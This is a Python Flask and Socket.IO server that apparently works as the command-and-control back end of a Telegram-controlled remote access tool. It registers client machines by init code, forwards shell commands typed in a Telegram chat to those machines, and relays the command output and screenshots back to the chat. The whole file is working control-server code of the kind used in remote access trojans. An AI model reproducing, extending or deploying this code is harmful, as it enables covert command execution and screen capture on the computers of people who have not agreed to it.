from dotenv import load_dotenv
load_dotenv()
from flask import Flask, request
from flask_socketio import SocketIO, emit
from telebot import telebot
from bot_messages_handler import *
from config import *
from utils import *
from visiting_stats_counter import *
import os

app = Flask(__name__)
socketio = SocketIO(app)


@app.route('/add-pending-client', methods=['POST'])
def add_pending_client():
    pending_init_codes.append(request.form['init_code'])
    update_overall_connections()
    return '0'

@app.route('/wait-for-initialization', methods=['POST'])
def wait_for_initialization():
    wait_until(lambda: request.form['init_code'] in bot_users)
    return '0'

@app.route('/remove-client', methods=['POST'])
def remove_client():
    if request.form['init_code'] not in bot_users:
        return '1'
    del bot_users[request.form['init_code']]
    return '0'

@app.route('/get-stats', methods=['GET'])
def get_statistics():
    return { 'overall': get_overall_connections(), 'active': len(bot_users), 'pending': len(pending_init_codes) }

@socketio.on('command_response')
def handle_command_response(data):
    client_id = data.split()[0] # data = client_id + ' ' + command_reply

    try:
        current_user = bot_users.get(client_id) 
    except:
        print('No such user. Initilization started again')
        emit('handle_reinitialization', '')
        return
    
    command_reply = data[(len(client_id) + 1)::]
    if len(command_reply) > 0:
        if command_reply.split()[0] == 'screenshot': # If response is a screenshot
            imageData = command_reply[(len(command_reply.split()[0]) + 1)::] # data = client_id + ' screenshot ' + imgdata if this is screenshot
            bot.send_photo(current_user.chat_id, convert_string_to_binary_image(imageData))
        else:
            bot.send_message(current_user.chat_id, command_reply)  # If response is a command reply
        bot.register_next_step_handler_by_chat_id(current_user.chat_id, current_user.get_shell_commands)
    
    wait_until(lambda: len(current_user.last_command) > 0 or client_id not in bot_users)

    emit('handle_bot_command', current_user.last_command) if client_id in bot_users else emit('handle_reinitialization', '')
 
    if current_user.last_command == 'screenshot':
        bot.send_message(current_user.chat_id, "Taking a screenshot...")

    
    current_user.last_command = ''

@app.route('/{}'.format(os.getenv('BOT_TOKEN')), methods=['POST'])
def get_message():
    bot.process_new_updates([telebot.types.Update.de_json(request.stream.read().decode("utf-8"))])
    return "Connected", 200



if __name__ == '__main__':
    socketio.run(app, port=os.environ.get('PORT', 80), use_reloader=True)
